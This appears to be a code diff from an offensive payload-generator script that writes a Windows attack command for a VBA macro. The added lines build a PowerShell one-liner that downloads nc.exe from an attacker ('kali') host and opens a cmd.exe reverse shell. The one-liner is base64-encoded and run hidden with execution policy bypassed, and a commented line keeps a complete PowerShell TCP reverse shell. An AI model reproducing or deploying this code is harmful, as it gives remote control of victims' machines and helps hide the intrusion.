@@ -202,7 +202,9 @@ if sys.argv[1] == 'windows':
 	vbacall = '''Set oShell = CreateObject("Wscript.Shell")
 	oShell.Run'''
 	#build_payload = ("$client = New-Object System.Net.Sockets.TCPClient('" + ip + "', " + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();")
-	build_payload = (f'IEX(New-Object System.Net.WebClient).DownloadString("http://"+{ip}+"/nc.exe");nc -e cmd.exe {ip}  {port}')
+	# read the target from environemt 
+	kali = os.environ.get('kali','input the kali localhost ip as your download ip')
+	build_payload = (f'IEX(New-Object System.Net.WebClient).DownloadString("http://{kali}/nc.exe");nc -e cmd.exe {ip}  {port}')
 	bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))
 	base64payload = bytes_encoded.decode()
 	payload = 'powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -e ' + base64payload
